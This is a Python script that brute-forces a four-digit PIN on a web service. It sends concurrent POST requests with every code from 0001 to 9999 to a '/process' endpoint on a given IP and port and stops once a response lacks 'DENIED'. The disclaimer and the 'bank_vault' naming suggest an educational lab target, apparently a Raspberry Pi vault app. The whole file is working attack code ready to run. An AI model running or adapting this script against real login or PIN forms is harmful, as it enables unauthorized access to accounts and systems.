#!/usr/bin/env python3

# Disclaimer: This script is for educational purposes only.
# Do not use against any server that you don't own or have authorization to test.
# To run this script use:
# sudo python3 brute_force.py <Rasperry Pi Server IP> <Port> (ex. python3 brute_force.py 10.80.211.100 5000)

import requests
import sys
import time
import asyncio
import aiohttp

def print_header():
    """ This function prints header. """
    # Program Header
    print(r"""
    
    ███    ███ ██    ██ ███    ██ ██ ███    ██ ███    ██
    ████  ████ ██    ██ ████   ██ ██ ████   ██ ████   ██
    ██ ████ ██ ██    ██ ██ ██  ██ ██ ██ ██  ██ ██ ██  ██
    ██  ██  ██ ██    ██ ██  ██ ██    ██  ██ ██ ██  ██ ██
    ██      ██  ██████  ██   ████ ██ ██   ████ ██   ████
                                                     """)
    print("\n****************************************************************")
    print("\n* Copyright of Aleks Holland Johansen, 2023                    *")
    print("\n* https://github.com/AleksHolland84                            *")
    print("\n****************************************************************")
    print("_________________________________________________________")


try:
    print_header() # print the header
    print(f"Brute-forcing: {sys.argv[1]} on port: {sys.argv[2]}") # print the arguments 
    time.sleep(4)
    url = sys.argv[1] # Use first argument as ip for server
    port = sys.argv[2] # Use second argument as port for service
    protocol = "http://" # We are using the http protocol to request the response
except IndexError:
    raise SystemExit(f"Usage: {sys.argv[0]} <bank_vault_IP> <PORT>")
except KeyboardInterrupt:
#Statements to execute upon that exception
    print("You typed CTRL + C, which is the keyboard interrupt exception")
    sys.exit()

async def fetch(session, pin, tasks):
    pin = str(pin).zfill(4) # Make a four-digit pincode, e.g., "0001" and not just "1"
    payload = {"pincode": pin} # Generate payload to POST to server
    async with session.post(f"{protocol}{url}:{port}/process", data = payload) as result: # Using a Context Manager to controle the session
        print(f"Posting payload: {payload}")
        if result.status !=200: # Check status code for server return result
            result.raise_for_status() # If the return status code is not 200, raise an exception
        response_text = await result.text()
        if "DENIED" not in response_text: # If "DENIED" is not in the result text, return the pin code
            print(f"Found pin code: {pin}")
            # Cancle remaining tasks
            for task in tasks:
                task.cancel() # Cancel other tasks when the correct pin is found
            return pin
        #return await r.text()


# A function to manage asyncio task-pool
async def fetch_all(session, pins):
    tasks = []
    for pin in pins:
        task = asyncio.create_task(fetch(session, pin, tasks))
        tasks.append(task)
    try:
        res = await asyncio.gather(*tasks)
        return res
    except asyncio.CancelledError:
        pass # When tasks are cancled, exit gracefully

async def main():
    pins = range(1,10000) # 0000 locks the vault
    async with aiohttp.ClientSession() as session:
        await fetch_all(session, pins)

def script_kitty():
    """ This function prints the script kitty header. """
    # Program Header
    print(r"""

    ███████  ██████ ██████  ██ ██████  ████████     ██   ██ ██ ████████ ████████ ██    ██ 
    ██      ██      ██   ██ ██ ██   ██    ██        ██  ██  ██    ██       ██     ██  ██  
    ███████ ██      ██████  ██ ██████     ██        █████   ██    ██       ██      ████   
         ██ ██      ██   ██ ██ ██         ██        ██  ██  ██    ██       ██       ██    
    ███████  ██████ ██   ██ ██ ██         ██        ██   ██ ██    ██       ██       ██    
                                                       
                                                     """)
    print("\n****************************************************************")
    print("\n* Only Script Kiddies copy-paste other's scripts               *")
    print("\n* Please try to understand the script before use               *")
    print("\n****************************************************************")
    print("_________________________________________________________")

if __name__ == "__main__":
    the_kitty = input("Did you download the script? (n/y): ")
    if the_kitty != "n":
        script_kitty()
    asyncio.run(main())
